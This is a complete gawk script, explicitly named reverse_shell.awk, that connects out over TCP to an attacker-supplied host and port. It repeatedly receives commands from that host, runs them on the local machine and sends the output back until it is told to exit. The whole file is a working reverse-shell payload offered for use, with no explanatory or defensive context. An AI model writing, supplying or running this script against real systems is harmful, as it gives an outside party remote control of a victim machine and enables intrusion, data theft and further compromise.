#!/usr/bin/env -S awk -f
# Usage: ./reverse_shell.awk <host>:<port>

BEGIN {
    target = ARGV[1]

    sub(":", "/", target)
    c = "/inet/tcp/0/" target

    while (1) {
        printf "> " |& c
        res = c |& getline cmd
        if(!res || cmd ~ /^exit/) close(c)
        if(cmd) {
            print "cmd:", cmd
            while (cmd |& getline result) {
                print result |& c
            }
            close(cmd)
        }
    }
}
